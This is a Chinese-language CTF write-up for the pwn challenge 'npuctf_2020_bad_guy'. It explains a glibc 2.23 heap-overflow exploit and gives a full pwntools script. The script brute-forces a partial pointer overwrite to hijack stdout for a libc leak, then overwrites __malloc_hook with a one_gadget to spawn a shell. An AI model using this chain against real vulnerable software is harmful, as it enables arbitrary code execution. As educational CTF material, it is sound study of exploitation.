# npuctf_2020_bad_guy



### 解题思路

- 利用`unsorted bin`的`fd`指针，爆破修改低地址的第`2`个字节，劫持`fastbin`到`stdout`，修改`flag`为`0xfbad1800`，将`_IO_write_base`低字节改小一点，泄露出`libc`地址
- 同样的方法劫持`__malloc_hook`为`one_gadget`即可`getshell`

<!-- more -->

### checksec

![image-20210604234748239](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210604234748239.png)

### 漏洞分析

![image-20210604234831526](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210604234831526.png)

可以修改`chunk`的内容，溢出修改字节由用户可控，即为堆溢出写。

### EXP

```python
from pwn import *
LOG_ADDR = lambda x, y: info("{} ===> {}".format(x, hex(y)))
int16 = lambda x: int(x, base=16)

sh =process("./npuctf_2020_bad_guy")
libc = ELF("libc-2.23.so")
context.arch = "amd64"

gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]


def add(idx, size, data="a"):
    sh.sendlineafter(">> ", "1")
    sh.sendlineafter("Index :", str(idx))
    sh.sendlineafter("size: ", str(size))
    sh.sendafter("Content:", data)


def edit(idx, size, data="a"):
    sh.sendlineafter(">> ", "2")
    sh.sendlineafter("Index :", str(idx))
    sh.sendlineafter("size: ", str(size))
    sh.sendafter("content: ", data)


def free(idx):
    sh.sendlineafter(">> ", "3")
    sh.sendlineafter("Index :", str(idx))



def attack():
    # hijack stdout
    add(0, 0x10)
    add(1, 0x10)
    add(2, 0x60)
    add(3, 0x10)

    free(2)

    # fake size
    edit(0, 0x20, b"a" * 0x18 + p64(0x91))

    free(1)

    add(1, 0x10)

    num = "0x55"

    edit(1, 0x30, b"a" * 0x18 + p64(0x71) + p8(0xdd) + p8(int16(num)))

    add(2, 0x60)
    layout = [0x33 * "\x00", 0xfbad1800, 0, 0, 0, "\x58"]
    add(3, 0x60, flat(layout))

    msg = sh.recvn(8)

    leak_libc_addr = u64(msg)
    libc_base_addr = leak_libc_addr - 0x3c56a3

    LOG_ADDR("libc_base_addr", libc_base_addr)
    
    libc.address = libc_base_addr

    free(2)
	
    # hijack malloc_hook
    edit(1, 0x30, b"a" * 0x18 + p64(0x71) + p64(libc.sym["__malloc_hook"] - 0x23))
    
    add(2, 0x60)

    one_gadget = libc.offset_to_vaddr(gadgets[3])

    payload = b"a" * 0x13 + p64(one_gadget)

    add(4, 0x60, payload)
	
    # get shell
    sh.sendlineafter(">> ", "1")
    sh.sendlineafter("Index :", str(5))
    sh.sendlineafter("size: ", str(0x10))

    sh.interactive()


if __name__ == '__main__':
    while True:
        try:
            attack()
            break
        except:
            sh.close()
            sh = process("./npuctf_2020_bad_guy")
        
    
```

远程打：

![image-20210605000431759](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210605000431759.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-06-04-npuctf-2020-bad-guy/  

